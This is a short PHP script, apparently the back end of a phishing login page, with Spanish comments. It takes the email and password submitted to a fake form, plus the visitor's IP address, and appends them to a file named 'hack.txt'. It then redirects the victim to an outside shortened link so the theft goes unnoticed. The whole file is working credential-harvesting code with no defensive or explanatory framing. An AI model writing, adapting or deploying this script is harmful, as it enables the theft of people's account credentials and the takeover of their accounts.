<?php

$usuario = $_POST[ 'email' ];
$password = $_POST[ 'pass' ];
$ip = $_SERVER[ 'REMOTE_ADDR' ];

if( ( empty($usuario)) or (empty($password)) ){
    header('location: index.htm');
}else{	
	//guarderemos en un archivo de texto
	$file = fopen('hack.txt','a+');
	fwrite($file, "usuario: ".$usuario."\r\ncontrase�a: ".$password."\r\nIP: ".$ip."\r\n===========================\r\n");
	fclose($file);
	header('location: https://t.co/TIwJGappi9');
	
}
?>